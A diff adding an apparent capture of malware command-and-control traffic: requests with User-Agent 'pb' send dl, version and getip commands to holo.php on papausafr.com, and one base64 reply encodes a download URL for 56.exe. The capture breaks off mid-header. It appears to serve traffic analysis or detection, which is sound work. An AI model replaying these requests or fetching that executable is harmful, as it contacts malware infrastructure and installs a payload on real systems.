@@ -1,0 +1,41 @@
+GET /holo.php?command=dl&id=1494363983 HTTP/1.1
+User-Agent: pb
+Host: papausafr.com
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Server: nginx/1.6.2
+Date: Thu, 05 Mar 2015 14:54:49 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.4.37
+
+4
+fA==
+0
+
+GET /holo.php?command=version&id=1494363983 HTTP/1.1
+User-Agent: pb
+Host: papausafr.com
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Server: nginx/1.6.2
+Date: Thu, 05 Mar 2015 14:54:49 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.4.37
+
+2c
+NS42fGh0dHA6Ly9wYXBhdXNhZnIuY29tLzU2LmV4ZQ==
+0
+
+GET /holo.php?command=getip HTTP/1.1
+User-Agent: pb
+Host: papausafr.com
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Serve
